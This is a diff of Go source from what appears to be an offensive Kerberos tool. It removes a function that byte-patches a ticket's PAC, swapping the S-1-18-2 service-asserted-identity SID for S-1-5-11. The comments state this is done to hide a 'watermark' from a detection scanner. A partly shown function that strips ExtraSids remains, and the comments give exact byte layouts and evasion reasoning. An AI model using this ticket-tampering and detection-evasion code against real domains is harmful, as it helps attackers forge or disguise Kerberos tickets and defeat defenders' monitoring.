@@ -839,56 +839,6 @@ func ExtractUserSIDFromPAC(pacData []byte) (*SID, error) {
 	return userSID, nil
 }
 
-// RewriteServiceAssertedIdentity substitutes S-1-18-2 (SERVICE_ASSERTED_IDENTITY)
-// with S-1-5-11 (AUTHENTICATED_USERS) in the PAC's ExtraSids.
-//
-// Ideal would be to REMOVE the SID entirely (legitimate AS-REQ kinit TGTs
-// have no authority-18 SID at all), but that requires decrementing SidCount
-// in KERB_VALIDATION_INFO and rewriting the deferred NDR data — non-trivial.
-// Zeroing the 12 bytes leaves SidCount=1 pointing at revision=0 / invalid
-// SID, which the KDC rejects with KRB_ERR_GENERIC.
-//
-// Substituting with S-1-5-11 (Authenticated Users, also 12 bytes: revision=1,
-// numSubAuth=1, authority=5, sub-auth=11) preserves NDR structural validity
-// while eliminating the authority-18 watermark that FIP's pattern scanner
-// targets. Authenticated Users is a well-known, ubiquitous SID that appears
-// in legitimate authentication tokens (though typically not in PAC ExtraSids
-// specifically — so it's still a residual anomaly vs legit kinit baseline,
-// just a much less specific one than authority-18).
-//
-// Returns the modified PAC bytes and the number of substitutions performed.
-func RewriteServiceAssertedIdentity(pacData []byte) ([]byte, int) {
-	// S-1-18-2 binary layout (12 bytes):
-	//   01                      revision = 1
-	//   01                      numSubAuthorities = 1
-	//   00 00 00 00 00 12       authority = 18 (big-endian, 6 bytes)
-	//   02 00 00 00             sub-authority = 2 (little-endian uint32)
-	target := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x02, 0x00, 0x00, 0x00}
-	// S-1-5-11 (Authenticated Users), same 12-byte layout:
-	//   01                      revision = 1
-	//   01                      numSubAuthorities = 1
-	//   00 00 00 00 00 05       authority = 5 (NT Authority, big-endian)
-	//   0b 00 00 00             sub-authority = 11 (little-endian uint32)
-	replacement := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x0b, 0x00, 0x00, 0x00}
-	out := make([]byte, len(pacData))
-	copy(out, pacData)
-	count := 0
-	for i := 0; i+len(target) <= len(out); i++ {
-		if bytes.Equal(out[i:i+len(target)], target) {
-			copy(out[i:i+len(target)], replacement)
-			count++
-		}
-	}
-	return out, count
-}
-
-// RemoveAuthorityAssertedIdentity is a deprecated alias for
-// RewriteServiceAssertedIdentity (which now substitutes S-1-18-2 → S-1-5-11).
-// Deprecated: use RewriteServiceAssertedIdentity.
-func RemoveAuthorityAssertedIdentity(pacData []byte) ([]byte, int) {
-	return RewriteServiceAssertedIdentity(pacData)
-}
-
 // ClearExtraSids removes the ExtraSids array from the PAC's LOGON_INFO buffer
 // via proper NDR-level edits:
 //   1. Find SidCount (pattern: Reserved3=0, SidCount=1-10, ExtraSids ptr=referent)
@@ -947,7 +897,7 @@ func ClearExtraSids(pacData []byte) ([]byte, int) {
 	}
 
 	// Step 2: find the ExtraSids deferred data by locating the SID bytes.
-	// The SID is one of: S-1-5-11 (after --strip-watermark substitution),
+	// The SID is one of the known authority-5/18 patterns we might find:
 	// S-1-18-1 (legacy substitution), or S-1-18-2 (untouched).
 	sidPatterns := [][]byte{
 		{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x0b, 0x00, 0x00, 0x00}, // S-1-5-11
